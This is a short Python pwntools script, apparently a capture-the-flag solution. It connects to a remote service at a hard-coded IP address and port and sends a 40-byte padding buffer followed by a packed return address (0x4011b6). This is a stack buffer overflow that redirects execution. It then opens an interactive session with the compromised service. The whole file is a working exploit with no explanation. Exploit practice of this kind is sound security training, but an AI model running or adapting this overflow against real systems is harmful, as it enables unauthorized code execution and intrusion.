from pwn import *

r = remote("152.118.201.241", 3007)

r.sendline(b'A'*40 + p64(0x4011b6))

r.interactive()